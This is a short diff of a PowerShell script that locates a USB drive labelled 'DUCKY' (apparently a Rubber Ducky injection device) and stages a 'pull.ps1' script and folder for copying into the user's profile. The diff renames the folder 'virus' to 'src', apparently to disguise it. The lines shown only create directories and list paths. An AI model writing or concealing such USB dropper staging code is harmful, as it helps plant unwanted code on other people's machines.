@@ -9,13 +9,13 @@ if ($duplicateProcess.Count -gt 1) {
 
 $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='DUCKY'").DriveLetter
 $localUsername = $env:USERNAME
-New-Item -Path "C:\Users\$localUsername\Document" -Name 'virus' -ItemType "directory"
-# New-Item -Path "C:\Users\$localUsername\Document\virus" -Name 'Virus' -ItemType "directory"
-$pullPathBeforeCopy = Get-ChildItem -Path "$driveLetter\virus\*" -Filter "pull.ps1" 
-$pullPathBeforeDelayCopy = Get-ChildItem -Path "C:\Users\$env:USERNAME\Contacts\virus" -Recurse -Filter "pull.ps1"
-$pathBeforeCopy = Get-ChildItem -Path "$driveLetter\" -Directory -Recurse -Filter "virus"
-$pathBeforeDelayedCopy = Get-ChildItem -Path C:\Users\$env:USERNAME\Contacts\virus
-$pathAfterCopy = "C:\Users\$localUsername\Document\virus"
+New-Item -Path "C:\Users\$localUsername\Document" -Name 'src' -ItemType "directory"
+# New-Item -Path "C:\Users\$localUsername\Document\src" -Name 'src' -ItemType "directory"
+$pullPathBeforeCopy = Get-ChildItem -Path "$driveLetter\src\*" -Filter "pull.ps1" 
+$pullPathBeforeDelayCopy = Get-ChildItem -Path "C:\Users\$env:USERNAME\Contacts\src" -Recurse -Filter "pull.ps1"
+$pathBeforeCopy = Get-ChildItem -Path "$driveLetter\" -Directory -Recurse -Filter "src"
+$pathBeforeDelayedCopy = Get-ChildItem -Path C:\Users\$env:USERNAME\Contacts\src
+$pathAfterCopy = "C:\Users\$localUsername\Document\src"
 
 
 if ($driveLetter) {
